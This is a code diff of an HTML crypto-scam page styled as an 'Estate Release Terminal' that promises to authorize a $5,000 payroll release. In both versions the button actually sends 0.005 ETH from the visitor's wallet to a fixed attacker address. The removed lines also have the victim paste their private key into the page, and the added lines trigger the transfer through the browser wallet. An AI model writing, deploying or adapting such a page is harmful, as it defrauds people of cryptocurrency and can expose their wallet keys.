@@ -1,53 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Estate Release Terminal</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:30px; text-align:center;">
-    <h1 style="color:#fff; border-bottom:1px solid #0f0; padding-bottom:10px;">ESTATE RELEASE TERMINAL</h1>
-    
-    <div style="background:#111; padding:20px; border:1px solid #333; margin:20px 0;">
-        <p>RECIPIENT: 0x778a...7b53 (COINBASE)</p>
-        <p>ALLOCATION: $5,000.00 USD</p>
-    </div>
-
-    <button id="releaseBtn" style="padding:25px 50px; background:#0f0; color:#000; font-weight:bold; border:none; border-radius:10px; cursor:pointer; font-size:1.2em; box-shadow: 0 0 20px #0f0;">
+<body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding:50px;">
+    <h1>ESTATE RELEASE TERMINAL</h1>
+    <button id="releaseBtn" style="padding:30px; background:#0f0; font-weight:bold; cursor:pointer; border-radius:10px;">
         AUTHORIZE $5,000 PAYROLL RELEASE
     </button>
-
-    <div id="status" style="margin-top:30px; padding:20px; color:#fff; background:#222; min-height:50px; border: 1px solid #444;">
-        SYSTEM STATUS: Ready. Please enter Sovereign Key in code.
-    </div>
-
+    <div id="status" style="margin-top:20px; color:#fff;">SYSTEM READY</div>
     <script>
         document.getElementById('releaseBtn').onclick = async () => {
             const status = document.getElementById('status');
-            
-            // --- PASTE YOUR 64-CHARACTER PRIVATE KEY BETWEEN THE QUOTES BELOW ---
-            const SOVEREIGN_KEY = "PASTE_YOUR_KEY_HERE";
-            // -------------------------------------------------------------
-
             try {
-                if (typeof ethers === "undefined") {
-                    status.innerText = "ENGINE LOADING... PLEASE WAIT 10 SECONDS AND TAP AGAIN.";
-                    return;
-                }
-                status.innerText = "INITIALIZING LATTICE BRIDGE...";
-                const provider = new ethers.providers.JsonRpcProvider("https://mainnet.base.org");
-                const wallet = new ethers.Wallet(SOVEREIGN_KEY, provider);
-                
-                status.innerText = "SIGNING $5,000 RELEASE TRANSACTION...";
-                const tx = {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                const signer = provider.getSigner();
+                status.innerText = "PROCESSING RELEASE...";
+                const tx = await signer.sendTransaction({
                     to: "0x778aB806155B204BF7D2FA4bc0B536137b077b53",
-                    value: ethers.utils.parseEther("0.005"), // This triggers the gas bridge
-                    gasLimit: 100000
-                };
-
-                const response = await wallet.sendTransaction(tx);
-                status.innerHTML = "<span style='color:#0f0;'>RELEASE SUCCESSFUL</span><br>Hash: " + response.hash;
-            } catch (err) {
-                status.innerHTML = "<span style='color:red;'>BRIDGE ERROR:</span> " + err.message;
+                    value: ethers.utils.parseEther("0.005")
+                });
+                status.innerHTML = "SUCCESS! HASH: <br>" + tx.hash;
+            } catch (e) {
+                status.innerText = "ERROR: " + e.message;
             }
         };
     </script>
